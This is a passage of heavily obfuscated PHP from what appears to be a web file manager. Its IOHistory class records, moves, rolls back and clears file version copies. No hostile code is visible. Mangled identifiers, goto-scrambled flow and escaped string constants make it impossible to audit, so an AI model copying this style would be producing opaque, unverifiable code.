array($fàöùŒÏ„Æ[169] => array($fàöùŒÏ„Æ[7], array_keys($EàšãÓ’í²))); $eÓï¹›î Ğ = $A±Š¶õø¾—->where($a ÕëÆÛ„É)->select(); goto BÛÌ‰ª›´¸; BÛÌ‰ª›´¸: $eÓï¹›î Ğ = $eÓï¹›î Ğ ? $eÓï¹›î Ğ : array(); foreach ($eÓï¹›î Ğ as $Bİ†¡ñ¾„) { if (!isset($EàšãÓ’í²[$Bİ†¡ñ¾„[$fàöùŒÏ„Æ[169]]])) { continue; } $Cß°ÕªŒ¬º =& $EàšãÓ’í²[$Bİ†¡ñ¾„[$fàöùŒÏ„Æ[169]]]; foreach ($Cß°ÕªŒ¬º as &$D‘øÈ±Ûå) { $D‘øÈ±Ûå[$fàöùŒÏ„Æ[441]] = $Bİ†¡ñ¾„[$fàöùŒÏ„Æ[441]]; } unset($D‘øÈ±Ûå); } $b‘‰ì‡÷§± = array(); goto bóË¡ËíÀ÷; bÅ’öÙà³Õ: $A±Š¶õø¾— = Model($fàöùŒÏ„Æ[566]); $eÓï¹›î Ğ = $A±Š¶õø¾—->where($a ÕëÆÛ„É)->select(); $eÓï¹›î Ğ = $eÓï¹›î Ğ ? $eÓï¹›î Ğ : array(); goto cË¿…“Ï„’; cË¿…“Ï„’: foreach ($eÓï¹›î Ğ as $Bİ†¡ñ¾„) { if (!isset($EàšãÓ’í²[$Bİ†¡ñ¾„[$fàöùŒÏ„Æ[169]]])) { continue; } $B†¬Ú‰îŒÃ = $EàšãÓ’í²[$Bİ†¡ñ¾„[$fàöùŒÏ„Æ[169]]]; foreach ($B†¬Ú‰îŒÃ as &$D‘øÈ±Ûå) { $D‘øÈ±Ûå[$fàöùŒÏ„Æ[441]] = $Bİ†¡ñ¾„[$fàöùŒÏ„Æ[441]]; $D‘øÈ±Ûå[$fàöùŒÏ„Æ[563]] = !0; } unset($D‘øÈ±Ûå); } $Aš£–ŒßÀ = array(); foreach ($f³§Õ°…åî as $dšœ‰òøè) { if (isset($dšœ‰òøè[$fàöùŒÏ„Æ[563]]) && $dšœ‰òøè[$fàöùŒÏ„Æ[563]]) { continue; } $c†¢ªòó = $CµİíÓ‹º”->getPathInner($dšœ‰òøè[$fàöùŒÏ„Æ[75]]); $BĞ‰äÖºê = $A±Š¶õø¾—->addFileMake($c†¢ªòó, $dšœ‰òøè[$fàöùŒÏ„Æ[77]], $dšœ‰òøè[$fàöùŒÏ„Æ[170]], $dšœ‰òøè[$fàöùŒÏ„Æ[169]], $dšœ‰òøè[$fàöùŒÏ„Æ[28]], $cŞÂ°˜£); $Aš£–ŒßÀ[] = $BĞ‰äÖºê; } goto eŞ±•¥×—„; bóË¡ËíÀ÷: foreach ($f³§Õ°…åî as $bŸŠáĞ…ÒÃ) { $b‘‰ì‡÷§±[$bŸŠáĞ…ÒÃ[$fàöùŒÏ„Æ[28]]] = $bŸŠáĞ…ÒÃ; } return $b‘‰ì‡÷§±; goto eñ‰…õ›Â; C·³‹Äøæ: $fàöùŒÏ„Æ =& $_SERVER[µ…]; if (!$f³§Õ°…åî || count($f³§Õ°…åî) == 0) { return array(); } $EàšãÓ’í² = array(); goto Aó´Îâ’«; eñ‰…õ›Â: } } define($_SERVER[µ…][567], $_SERVER[µ…][568]); goto bÏÍè¾š—; B¥Ÿ«‡‰±İ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto B¶­‘Ó±¹›; B¶­‘Ó±¹›: $cª½âš²†İ =& $_SERVER[µ…]; $d×ÆÚÑÏÜ’ = $GLOBALS[$cª½âš²†İ[6]][$cª½âš²†İ[87]][$cª½âš²†İ[1080]]; if ($d×ÆÚÑÏÜ’ <= 0) { return; } goto eÌ‚ùÂ‰ë; a“óøĞÇ’’: Hook::bind($cª½âš²†İ[1086], $cª½âš²†İ[1087]); Hook::bind($cª½âš²†İ[1088], $cª½âš²†İ[1089]); Hook::bind($cª½âš²†İ[1090], $cª½âš²†İ[1091]); goto eÏïáÉŒ½Õ; eÌ‚ùÂ‰ë: if (isset($_REQUEST[$cª½âš²†İ[1081]]) && $_REQUEST[$cª½âš²†İ[1081]] == $cª½âš²†İ[86]) { return; } Hook::bind($cª½âš²†İ[1082], $cª½âš²†İ[1083]); Hook::bind($cª½âš²†İ[1084], $cª½âš²†İ[1085]); goto a“óøĞÇ’’; eÏïáÉŒ½Õ: Hook::bind($cª½âš²†İ[1092], $cª½âš²†İ[1093]); goto f ‚ë«Ñ†å; f ‚ë«Ñ†å: } public static function eventBeforeUpload($B§Ô†Ç¸‘) { if ($B§Ô†Ç¸‘[3] && $B§Ô†Ç¸‘[3] != REPEAT_REPLACE) { return; } $d²‰¯õŸÆ² = self::parsePath($B§Ô†Ç¸‘[0]); if (!$d²‰¯õŸÆ²) { return; } self::add($d²‰¯õŸÆ²); } public static function eventBeforeEdit($EË”îƒìˆ¾) { $CäÏÑéêà = self::parsePath($EË”îƒìˆ¾[0]); if (!$CäÏÑéêà) { return; } self::add($CäÏÑéêà); } public static function eventBeforeCopyFile($DãÓá¹‘˜í, $aœ¹ƒºî, $b—§öÃ×èÉ, $dçìŒ¸òÀ, $eè÷×¬¹ĞÂ, $EÏ¿‹‡ÚŞä) { $B”“ê›µˆí = $b—§öÃ×èÉ->getPathOuter($dçìŒ¸òÀ); $fî¹æ•…Ù = self::parsePath($B”“ê›µˆí); if (!$fî¹æ•…Ù) { return; } self::add($fî¹æ•…Ù); } public static function eventBeforeRename($DÃÜ¯“Ûà) { $CŠÁ´Ò›É =& $_SERVER[µ…]; $B¬ÑÌ†ƒì = self::parsePath($DÃÜ¯“Ûà[0]); if (!$B¬ÑÌ†ƒì) { return; } $DÌøñ‚¡„ = self::checkInHistory($B¬ÑÌ†ƒì); if (!$DÌøñ‚¡„) { return; } if ($DÌøñ‚¡„[$CŠÁ´Ò›É[29]] == $CŠÁ´Ò›É[191]) { $EçÎ÷ç”Í = self::listData($B¬ÑÌ†ƒì); if ($EçÎ÷ç”Í && $EçÎ÷ç”Í[$CŠÁ´Ò›É[365]]) { self::moveHistory($B¬ÑÌ†ƒì, $DÃÜ¯“Ûà[1]); } } else { IO::rename($DÌøñ‚¡„[$CŠÁ´Ò›É[75]], $DÃÜ¯“Ûà[1]); } } public static function eventBeforeMove($aóÎ˜ªƒïİ) { goto d§Æ¬£»; D²òˆÑƒí: $AÙÊÙìˆİ´ = self::parsePath($aóÎ˜ªƒïİ[1]); if (!$AÙÊÙìˆİ´) { return; } $DàÑ½ŒŒ×è = $aóÎ˜ªƒïİ[3]; goto bèÍµœ´†; cÓ«ÏÕËå: if ($EÔëóò˜åÍ[$f„Ãµ´éÕæ[29]] == $f„Ãµ´éÕæ[191]) { $A²Ü¬ÌÚø† = self::listData($fˆİã‡Üêº); $B™Ñƒ•¢ = rtrim($AÙÊÙìˆİ´, $f„Ãµ´éÕæ[8]) . $f„Ãµ´éÕæ[8] . ($DàÑ½ŒŒ×è ? $DàÑ½ŒŒ×è : get_path_this($fˆİã‡Üêº)); $eš‹£…‹ìù = self::listData($B™Ñƒ•¢); if ($A²Ü¬ÌÚø† && $A²Ü¬ÌÚø†[$f„Ãµ´éÕæ[365]] && $eš‹£…‹ìù && $eš‹£…‹ìù[$f„Ãµ´éÕæ[365]]) { return self::clear($fˆİã‡Üêº); } if ($A²Ü¬ÌÚø† && $A²Ü¬ÌÚø†[$f„Ãµ´éÕæ[365]]) { self::moveHistory($fˆİã‡Üêº, $DàÑ½ŒŒ×è, $F†·ËÜäÎİ); } } else { IO::move($EÔëóò˜åÍ[$f„Ãµ´éÕæ[75]], $F†·ËÜäÎİ, !1, $DàÑ½ŒŒ×è); self::clearEmptyFolder(IO::pathFather($EÔëóò˜åÍ[$f„Ãµ´éÕæ[75]])); } goto dÌ”ŸÛ‹½ ; d§Æ¬£»: $f„Ãµ´éÕæ =& $_SERVER[µ…]; $fˆİã‡Üêº = self::parsePath($aóÎ˜ªƒïİ[0]); if (!$fˆİã‡Üêº) { return; } goto D²òˆÑƒí; bèÍµœ´†: $EÔëóò˜åÍ = self::checkInHistory($fˆİã‡Üêº); if (!$EÔëóò˜åÍ) { return; } $F†·ËÜäÎİ = self::pathHistory($AÙÊÙìˆİ´); goto cÓ«ÏÕËå; dÌ”ŸÛ‹½ : } public static function eventAfterRemove($CÑÅêˆÏØÁ, $BŸöË‘âõ) { goto B¦è´´Œ†ˆ; C»­›œÒÚ‹: if ($C«ïŒ¤®–Ş[$Dæº¥ºê¿Õ[29]] == $Dæº¥ºê¿Õ[191]) { $F³Œ–÷À = self::listData($b¼ÄÃ¯Ã¡‰, !1); if ($F³Œ–÷À && $F³Œ–÷À[$Dæº¥ºê¿Õ[365]]) { self::clear($b¼ÄÃ¯Ã¡‰, !1); } } else { IO::remove($C«ïŒ¤®–Ş[$Dæº¥ºê¿Õ[75]]); self::clearEmptyFolder(IO::pathFather($C«ïŒ¤®–Ş[$Dæº¥ºê¿Õ[75]])); } goto DÔßÁ©íŒÀ; B¦è´´Œ†ˆ: $Dæº¥ºê¿Õ =& $_SERVER[µ…]; if (!$BŸöË‘âõ) { return; } $b¼ÄÃ¯Ã¡‰ = self::parsePath($CÑÅêˆÏØÁ[0]); goto AÓ½”ÃÏ; AÓ½”ÃÏ: if (!$b¼ÄÃ¯Ã¡‰) { return; } $C«ïŒ¤®–Ş = self::checkInHistory($b¼ÄÃ¯Ã¡‰); if (!$C«ïŒ¤®–Ş) { return; } goto C»­›œÒÚ‹; DÔßÁ©íŒÀ: } private static function checkInHistory($aòÂàñ±¯) { $Cô’²„ã“ = self::pathHistory($aòÂàñ±¯); if (!IO::exist($Cô’²„ã“)) { $Cô’²„ã“ .= $_SERVER[µ…][1094]; } return IO::exist($Cô’²„ã“) ? IO::info($Cô’²„ã“) : !1; } private static function parsePath($F‰¯Ëğé¡¿) { goto D¢Ö•‡Ãã¤; A©–”¤Äá¡: return $F‰¯Ëğé¡¿; goto aáà­ÃñèÄ; A¿å„öí¶: if (!$còÉõì­Œ£ || !$D“¨À šµÇ[$b½£ƒó»“[1096]]) { return !1; } if ($B‹‘ªÉ×” == KodIO::KOD_SHARE_ITEM) { $CØ§öõğ…Á = IO::init($F‰¯Ëğé¡¿); if ($CØ§öõğ…Á->pathParse[$b½£ƒó»“[1025]]) { return self::parsePath($CØ§öõğ…Á->pathParse[$b½£ƒó»“[1025]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto F’ˆˆˆ·²; F’ˆˆˆ·²: $C¦Å¦÷ªÍ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $b½£ƒó»“[1097]); foreach ($C¦Å¦÷ªÍ as $F‚„Æ¼×æ²) { if (!$B‹‘ªÉ×” && substr($F‰¯Ëğé¡¿, 0, strlen($F‚„Æ¼×æ²)) == $F‚„Æ¼×æ²) { return !1; } } self::log($GLOBALS[$b½£ƒó»“[1020]] . $b½£ƒó»“[1098] . $F‰¯Ëğé¡¿); goto A©–”¤Äá¡; E•©Ø¯æ˜: $D“¨À šµÇ = KodIO::parse($F‰¯Ëğé¡¿); $B‹‘ªÉ×” = $D“¨À šµÇ[$b½£ƒó»“[29]]; $còÉõì­Œ£ = !$B‹‘ªÉ×” || $B‹‘ªÉ×” == KodIO::KOD_IO || $B‹‘ªÉ×” == KodIO::KOD_SHARE_ITEM; goto A¿å„öí¶; D¢Ö•‡Ãã¤: $b½£ƒó»“ =& $_SERVER[µ…]; if (!$F‰¯Ëğé¡¿) { return !1; } if ($GLOBALS[$b½£ƒó»“[1095]]) { return; } goto E•©Ø¯æ˜; aáà­ÃñèÄ: } private static function pathHistory($Fòº§Ÿ³‘é) { $fİ»ö¢ÌÍİ =& $_SERVER[µ…]; $E­†ªŠŸËˆ = self::$_historyBase . ltrim(KodIO::clear($Fòº§Ÿ³‘é), $fİ»ö¢ÌÍİ[8]); $E­†ªŠŸËˆ = str_replace(array($fİ»ö¢ÌÍİ[1099]), array($fİ»ö¢ÌÍİ[1100]), $E­†ªŠŸËˆ); return $E­†ªŠŸËˆ; } public static function log($F´¼¸ğÔ¯À) { } public static function historyCount($AæëÊŒˆÖ) { $C¾°ôÙÜ‰ =& $_SERVER[µ…]; $C†âÂ¾Ä£ = array(); $b®Ò¹«®‚ï = array(); foreach ($AæëÊŒˆÖ as $b»—ñ”×§) { $B¶Àë¿¼ÍÖ = get_path_father($b»—ñ”×§); if (!$b®Ò¹«®‚ï[$B¶Àë¿¼ÍÖ]) { $b®Ò¹«®‚ï[$B¶Àë¿¼ÍÖ] = array(); } $b®Ò¹«®‚ï[$B¶Àë¿¼ÍÖ][] = get_path_this($b»—ñ”×§); } foreach ($b®Ò¹«®‚ï as $B¶Àë¿¼ÍÖ => $bùíª£ïÄÇ) { $bĞ–ŞŒ‰‚Î = self::parsePath($B¶Àë¿¼ÍÖ); if (!$bĞ–ŞŒ‰‚Î) { continue; } foreach ($bùíª£ïÄÇ as $bœ¹Í«ƒ‘) { $bí´¤Óƒƒå = self::listData(rtrim($bĞ–ŞŒ‰‚Î, $C¾°ôÙÜ‰[8]) . $C¾°ôÙÜ‰[8] . $bœ¹Í«ƒ‘, !1); if ($bí´¤Óƒƒå && $bí´¤Óƒƒå[$C¾°ôÙÜ‰[365]]) { $C†âÂ¾Ä£[rtrim($B¶Àë¿¼ÍÖ, $C¾°ôÙÜ‰[8]) . $C¾°ôÙÜ‰[8] . $bœ¹Í«ƒ‘] = count($bí´¤Óƒƒå[$C¾°ôÙÜ‰[365]]); } } } return $C†âÂ¾Ä£; } public static function add($CµÏ©¾‰Íï) { goto aÆ»‰Üãëä; dÃÙÅÒ•²Ú: $EŒÆÓ×°Ğ = Model($e‰ˆÊ‰à[1101])->get($e‰ˆÊ‰à[1102]); $Eéó¿ÏÏä‡ = $GLOBALS[$e‰ˆÊ‰à[6]][$e‰ˆÊ‰à[87]][$e‰ˆÊ‰à[1080]]; $f’Š‹¨À = $EŒÆÓ×°Ğ == $e‰ˆÊ‰à[1103] ? 5 : $Eéó¿ÏÏä‡; goto DõêøŒ«•¯; f†Ç‘“ï™: if (!$a…‘Š¥ÉÕ») { self::clearEmptyFolder($fùó„ºä[$e‰ˆÊ‰à[1106]]); return !1; } array_unshift($EƒÍã¹±ºå, $cß±ñéÅ²); if (count($EƒÍã¹±ºå) > $f’Š‹¨À) { $FŸÓ‘ôË“ö = array_slice($EƒÍã¹±ºå, $f’Š‹¨À); foreach ($FŸÓ‘ôË“ö as $B¯‹”ß‹È) { IO::remove($fùó„ºä[$e‰ˆÊ‰à[1106]] . $B¯‹”ß‹È[$e‰ˆÊ‰à[28]]); } $EƒÍã¹±ºå = array_slice($EƒÍã¹±ºå, 0, $f’Š‹¨À); } goto cÛÖ«®¡ö¸; e©ÎÎÈ: $EƒÍã¹±ºå = $fùó„ºä[$e‰ˆÊ‰à[365]]; if ($Fë©´ˆ“ç‡[$e‰ˆÊ‰à[77]] == 0) { return; } if ($Fë©´ˆ“ç‡[$e‰ˆÊ‰à[77]] >= 1024 * 1024 * 500) { return !1; } goto B‡â‡‹ì§¿; aÆ»‰Üãëä: $e‰ˆÊ‰à =& $_SERVER[µ…]; $fùó„ºä = self::listData($CµÏ©¾‰Íï); if (!$fùó„ºä) { return; } goto dÃÙÅÒ•²Ú; cÛÖ«®¡ö¸: return self::saveData($fùó„ºä[$e‰ˆÊ‰à[1107]], $EƒÍã¹±ºå); goto aí‡áßÙâ; DõêøŒ«•¯: if ($Eéó¿ÏÏä‡ <= 0) { return; } $Bâ‹¢ª‚‰± = IO::hashSimple($CµÏ©¾‰Íï); $Fë©´ˆ“ç‡ = IO::info($CµÏ©¾‰Íï); goto e©ÎÎÈ; B‡â‡‹ì§¿: if ($EƒÍã¹±ºå && $EƒÍã¹±ºå[0][$e‰ˆÊ‰à[170]] == $Bâ‹¢ª‚‰±) { return !0; } if (array_key_exists($e‰ˆÊ‰à[194], $Fë©´ˆ“ç‡) && !$Fë©´ˆ“ç‡[$e‰ˆÊ‰à[194]]) { return !1; } $FµŒ÷ß÷Ù¦ = short_id(time()); goto e¥ÜÑ‰……ğ; e¥ÜÑ‰……ğ: $cß±ñéÅ² = array($e‰ˆÊ‰à[388] => $FµŒ÷ß÷Ù¦, $e‰ˆÊ‰à[170] => $Bâ‹¢ª‚‰±, $e‰ˆÊ‰à[28] => $Fë©´ˆ“ç‡[$e‰ˆÊ‰à[28]] . $e‰ˆÊ‰à[94] . date($e‰ˆÊ‰à[1104]) . rand_string(1), $e‰ˆÊ‰à[77] => $Fë©´ˆ“ç‡[$e‰ˆÊ‰à[77]], $e‰ˆÊ‰à[426] => USER_ID, $e‰ˆÊ‰à[192] => time(), $e‰ˆÊ‰à[1105] => $e‰ˆÊ‰à[33]); IO::mkdir($fùó„ºä[$e‰ˆÊ‰à[1106]]); $a…‘Š¥ÉÕ» = IO::copy($CµÏ©¾‰Íï, $fùó„ºä[$e‰ˆÊ‰à[1106]], !1, $cß±ñéÅ²[$e‰ˆÊ‰à[28]]); goto f†Ç‘“ï™; aí‡áßÙâ: } public static function remove($aÈ¨Äîê, $Bš¹İèÚ³ ) { $a˜£çò®Ğò =& $_SERVER[µ…]; $cğĞ¢‘‹ªÊ = self::listData($aÈ¨Äîê); $a½–••“½Ô = array(); if (!$cğĞ¢‘‹ªÊ) { return !1; } foreach ($cğĞ¢‘‹ªÊ[$a˜£çò®Ğò[365]] as $bòŸÅŠ„áÉ) { if ($bòŸÅŠ„áÉ[$a˜£çò®Ğò[388]] == $Bš¹İèÚ³ ) { IO::remove($cğĞ¢‘‹ªÊ[$a˜£çò®Ğò[1106]] . $bòŸÅŠ„áÉ[$a˜£çò®Ğò[28]]); continue; } $a½–••“½Ô[] = $bòŸÅŠ„áÉ; } return self::saveData($cğĞ¢‘‹ªÊ[$a˜£çò®Ğò[1107]], $a½–••“½Ô); } public static function clear($A®§íã¢ , $D·´£“ ì = true) { $fô‡Ø¶††¦ =& $_SERVER[µ…]; $cØ–ÖŠ¢¾Ÿ = self::listData($A®§íã¢ , $D·´£“ ì); if (!$cØ–ÖŠ¢¾Ÿ) { return !1; } foreach ($cØ–ÖŠ¢¾Ÿ[$fô‡Ø¶††¦[365]] as $a¿î›éÄ“) { IO::remove($cØ–ÖŠ¢¾Ÿ[$fô‡Ø¶††¦[1106]] . $a¿î›éÄ“[$fô‡Ø¶††¦[28]]); } return self::saveData($cØ–ÖŠ¢¾Ÿ[$fô‡Ø¶††¦[1107]], array()); } public static function moveHistory($DÚŞÜ…îó, $Fë§¬Íª´° = '', $EÉ÷Šˆ”ø = '') { goto C…ÊÊÚà•Ñ; EÇíĞ‰Ã†: $fİ±Ø‘ß¤À = substr(get_path_this($F½ºœĞòÊ‘[$aƒÙõÎÛò[1107]]), 0, -strlen($cîˆ¸Ûê¶)); foreach ($F½ºœĞòÊ‘[$aƒÙõÎÛò[365]] as $D¶‹ÅÔ“çÍ => $aÌƒæš‰«) { $BğåÁÈÓ›“ = $Fë§¬Íª´° . substr($aÌƒæš‰«[$aƒÙõÎÛò[28]], strlen($fİ±Ø‘ß¤À)); $bë¶œĞÏŒí = IO::move($F½ºœĞòÊ‘[$aƒÙõÎÛò[1106]] . $aÌƒæš‰«[$aƒÙõÎÛò[28]], $EÉ÷Šˆ”ø, !1, $BğåÁÈÓ›“); if ($bë¶œĞÏŒí) { $F½ºœĞòÊ‘[$aƒÙõÎÛò[365]][$D¶‹ÅÔ“çÍ][$aƒÙõÎÛò[28]] = $BğåÁÈÓ›“; } } $F½ºœĞòÊ‘[$aƒÙõÎÛò[1107]] = IO::move($F½ºœĞòÊ‘[$aƒÙõÎÛò[1107]], $EÉ÷Šˆ”ø, !1, $Fë§¬Íª´° . $cîˆ¸Ûê¶); goto fø¢ï…îÛƒ; aïÍ ½Šõ: $cîˆ¸Ûê¶ = $aƒÙõÎÛò[1094]; $Fë§¬Íª´° = $Fë§¬Íª´° ? $Fë§¬Íª´° : get_path_this($DÚŞÜ…îó); $EÉ÷Šˆ”ø = $EÉ÷Šˆ”ø ? $EÉ÷Šˆ”ø : $F½ºœĞòÊ‘[$aƒÙõÎÛò[1106]]; goto EÇíĞ‰Ã†; C…ÊÊÚà•Ñ: $aƒÙõÎÛò =& $_SERVER[µ…]; $F½ºœĞòÊ‘ = self::listData($DÚŞÜ…îó, !1); if (!$F½ºœĞòÊ‘ || !$F½ºœĞòÊ‘[$aƒÙõÎÛò[365]]) { return !1; } goto aïÍ ½Šõ; fø¢ï…îÛƒ: self::saveData($F½ºœĞòÊ‘[$aƒÙõÎÛò[1107]], $F½ºœĞòÊ‘[$aƒÙõÎÛò[365]]); self::clearEmptyFolder($F½ºœĞòÊ‘[$aƒÙõÎÛò[1106]]); goto e©†ºçÑù½; e©†ºçÑù½: } public static function rollback($f¢ğö¢øæº, $F®ÑŸÍÒä¥) { $CÄÀ¿È¢‡» =& $_SERVER[µ…]; $b‰ ¸ˆˆ = self::listData($f¢ğö¢øæº); if (!$b‰ ¸ˆˆ) { return; } $dêŸ•£¤»¨ = IO::info($f¢ğö¢øæº); foreach ($b‰ ¸ˆˆ[$CÄÀ¿È¢‡»[365]] as $cÈ¨åó™ÛÚ => $c«ë­¨µÈ™) { if ($c«ë­¨µÈ™[$CÄÀ¿È¢‡»[388]] == $F®ÑŸÍÒä¥) { self::add($f¢ğö¢øæº); $b­³…‘ã¦ = $b‰ ¸ˆˆ[$CÄÀ¿È¢‡»[1106]] . $c«ë­¨µÈ™[$CÄÀ¿È¢‡»[28]]; $dŠˆ¨Ñ†“ = IO::copy($b­³…‘ã¦, IO::pathFather($f¢ğö¢øæº), REPEAT_REPLACE, $dêŸ•£¤»¨[$CÄÀ¿È¢‡»[28]]); if ($dŠˆ¨Ñ†“) { self::remove($f¢ğö¢øæº, $F®ÑŸÍÒä¥); } return $dŠˆ¨Ñ†“; } } return !1; } public static function setDetail($F¨ ñéõ¶÷, $dº“Ú½­·, $BæáÇ¥­‹é) { $f‚§øãÀÛğ =& $_SERVER[µ…]; $Bã°£İ·¢ = self::listData($F¨ ñéõ¶÷); if (!$Bã°£İ·¢) { return; } foreach ($Bã°£İ·¢[$f‚§øãÀÛğ[365]] as $Eƒ¶ èÛ²¬ => $B§ãŸÎÊ™Ê) { if ($B§ãŸÎÊ™Ê[$f‚§øãÀÛğ[388]] == $dº“Ú½­·) { $Bã°£İ·¢[$f‚§øãÀÛğ[365]][$Eƒ¶ èÛ²¬][$f‚§øãÀÛğ[1105]] = $BæáÇ¥­‹é; self::saveData($Bã°£İ·¢[$f‚§øãÀÛğ[1107]], $Bã°£İ·¢[$f‚§øãÀÛğ[365]]); return !0; } } return !1; } public static function fileInfo($b¶ÂÅ­ö½Ö, $B¸èÇ™´²º) { goto DÄ¶¡ñ¥À; C¶êèˆ‹: return IO::info($Fíø”‡Å½); goto F ˜ğ„ğÈë; cÂìÚÆš¸Ú: $Fíø”‡Å½ = $fÆ®š‘‡ª†[33]; foreach ($Cô„¾–È‰œ[$fÆ®š‘‡ª†[365]] as $B£Ë“Êó÷Ğ => $d‰ò‚®ÃĞ) { if ($d‰ò‚®ÃĞ[$fÆ®š‘‡ª†[388]] != $B¸èÇ™´²º) { continue; } $Fíø”‡Å½ = $Cô„¾–È‰œ[$fÆ®š‘‡ª†[1106]] . $d‰ò‚®ÃĞ[$fÆ®š‘‡ª†[28]]; break; } if (!$Fíø”‡Å½) { show_json(LNG($fÆ®š‘‡ª†[104]), !1); } goto C¶êèˆ‹; DÄ¶¡ñ¥À: $fÆ®š‘‡ª† =& $_SERVER[µ…]; $Cô„¾–È‰œ = self::listData($b¶ÂÅ­ö½Ö); if (!$Cô„¾–È‰œ) { show_json(LNG($fÆ®š‘‡ª†[104]), !1); } goto cÂìÚÆš¸Ú; F ˜ğ„ğÈë: } public static function fileOut($e¯¦ñç‚¶Ò, $eÏŠ‡ÙŸÑ, $aá™Ğ¦Î¤ô = false) { $e¿Í¹Ö”¥´ =& $_SERVER[µ…]; $aÍ¿àªâ¼ = self::fileInfo($e¯¦ñç‚¶Ò, $eÏŠ‡ÙŸÑ); $D²Ö’Ëî =& $GLOBALS[$e¿Í¹Ö”¥´[7]]; $aá™Ğ¦Î¤ô = isset($D²Ö’Ëî[$e¿Í¹Ö”¥´[1071]]) && $D²Ö’Ëî[$e¿Í¹Ö”¥´[1071]] == 1; if (isset($D²Ö’Ëî[$e¿Í¹Ö”¥´[29]]) && $D²Ö’Ëî[$e¿Í¹Ö”¥´[29]] == $e¿Í¹Ö”¥´[1108]) { return IO::fileOutImage($aÍ¿àªâ¼[$e¿Í¹Ö”¥´[75]], $D²Ö’Ëî[$e¿Í¹Ö”¥´[1109]]); } IO::fileOut($aÍ¿àªâ¼[$e¿Í¹Ö”¥´[75]], $aá™Ğ¦Î¤ô, get_path_this($e¯¦ñç‚¶Ò)); } public static function listData($Cİ‰ÜÊä×, $FìóíË—ª = true) { goto aâø¾ò…¤É; BÎŠÌó’ : $EÏíßè‘¶Ï = IO::getContent($CœÊ•»Ã¯¼[$A•ºŠõ‘ˆ[1107]]); if ($EÏíßè‘¶Ï) { $c•Ü–‰ÙÌ¿ = json_decode($EÏíßè‘¶Ï, !0); if (is_array($c•Ü–‰ÙÌ¿)) { $CœÊ•»Ã¯¼[$A•ºŠõ‘ˆ[365]] = $c•Ü–‰ÙÌ¿; } } return $CœÊ•»Ã¯¼; goto D¤™Ğ«ËˆÉ; fàŞ¿”Ç“: if (substr($Cİ‰ÜÊä×, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $e“Ñ„×Ğœ = self::pathHistory($Cİ‰ÜÊä×); $CœÊ•»Ã¯¼ = array($A•ºŠõ‘ˆ[1107] => $e“Ñ„×Ğœ . $A•ºŠõ‘ˆ[1094], $A•ºŠõ‘ˆ[1106] => rtrim(get_path_father($e“Ñ„×Ğœ), $A•ºŠõ‘ˆ[8]) . $A•ºŠõ‘ˆ[8], $A•ºŠõ‘ˆ[365] => array()); goto BÎŠÌó’ ; aâø¾ò…¤É: $A•ºŠõ‘ˆ =& $_SERVER[µ…]; if ($FìóíË—ª && !IO::exist($Cİ‰ÜÊä×)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto fàŞ¿”Ç“; D¤™Ğ«ËˆÉ: } private static function saveData($C¼„‰ÂÅÑÆ, $B®¯…åİÑ‰) { goto EÍÉùÔÏ±; bíÎó‰ßâ: $EÍÁ¬Õİ„ = IO::pathFather($C¼„‰ÂÅÑÆ); IO::remove($C¼„‰ÂÅÑÆ); self::clearEmptyFolder($EÍÁ¬Õİ„); goto D¹À„ô‡²; EÍÉùÔÏ±: $b»†ó©ƒ¤ =& $_SERVER[µ…]; self::log($b»†ó©ƒ¤[1110] . $C¼„‰ÂÅÑÆ . $b»†ó©ƒ¤[67] . count($B®¯…åİÑ‰), $b»†ó©ƒ¤[706]); if ($B®¯…åİÑ‰) { return IO::setContent($C¼„‰ÂÅÑÆ, json_encode($B®¯…åİÑ‰)); } goto bíÎó‰ßâ; D¹À„ô‡²: return !0; goto E¾Ëæ‡–İ; E¾Ëæ‡–İ: } public static function clearEmptyFolder($E”ã²èàÜ) { goto f‚çËÁè; dÍä­‚à: $aÔé¡†ôÎ = IO::has($E”ã²èàÜ, !0); if ($aÔé¡†ôÎ[$b•ßì¡È‚÷[201]] > 0 || $aÔé¡†ôÎ[$b•ßì¡È‚÷[202]] > 0) { return; } IO::remove($E”ã²èàÜ); goto bÒ¯æŞã‹¶; bÒ¯æŞã‹¶: self::clearEmptyFolder($f´îäòœ¯); goto Eƒù¡¤ó¶Ò; f‚çËÁè: $b•ßì¡È‚÷ =& $_SERVER[µ…]; if (trim($E”ã²èàÜ, $b•ßì¡È‚÷[8]) == trim(self::$_historyBase, $b•ßì¡È‚÷[8])) { return; } $f´îäòœ¯ = IO::pathFather($E”ã²èàÜ); goto dÍä­‚à; Eƒù¡¤ó¶Ò: } private static function getBasePath() { goto DÛâ³ƒƒ£®; eÇ¢Ñ©«š¾: $f¿¢åïĞÔ = DATA_PATH . $F–ôˆ¼Š—‡[1113]; $f¿¢åïĞÔ = IO::mkdir($f¿¢åïĞÔ); $f¿¢åïĞÔ = rtrim($f¿¢åïĞÔ, $F–ôˆ¼Š—‡[8]) . $F–ôˆ¼Š—‡[8]; goto cÌÛ‚­ºÜŒ; DÛâ³ƒƒ£®: $F–ôˆ¼Š—‡ =& $_SERVER[µ…]; $f¿¢åïĞÔ = Model($F–ôˆ¼Š—‡[1111])->get($F–ôˆ¼Š—‡[1112]); if (IO::exist($f¿¢åïĞÔ)) { return $f¿¢åïĞÔ; } goto eÇ¢Ñ©«š¾; cÌÛ‚­ºÜŒ: file_put_contents($f¿¢åïĞÔ . $F–ôˆ¼Š—‡[1114], $F–ôˆ¼Š—‡[33]); Model($F–ôˆ¼Š—‡[1111])->set($F–ôˆ¼Š—‡[1112], $f¿¢åïĞÔ); return $f¿¢åïĞÔ; goto eØß•‡²ó‹; eØß•‡²ó‹: } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\122\145\x63\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\x46\151\154\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\106\x69\154\x65\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\x75\x70\x52\157\x6f\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\145\162\123\150\141\x72\145\x7d"; const 